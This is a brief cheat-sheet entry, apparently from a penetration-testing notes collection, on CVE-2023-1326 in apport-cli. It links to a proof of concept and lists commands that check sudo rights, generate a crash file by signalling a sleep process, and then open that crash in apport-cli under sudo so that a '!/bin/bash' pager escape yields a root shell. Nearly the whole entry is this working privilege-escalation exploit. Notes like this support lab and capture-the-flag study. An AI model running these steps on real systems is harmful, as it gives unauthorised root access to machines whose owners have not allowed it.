# apport-clie
#crash #crashdump

See [here](https://github.com/diego-tella/CVE-2023-1326-PoC/blob/main/README.md).

1. Check if apport-cli is in `sudo -l`
2. Create a crash file (`sleep 500 &; kill -s SIGTRAP $(pgrep sleep)`)
4. `sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash` -> `V` -> `!/bin/bash`

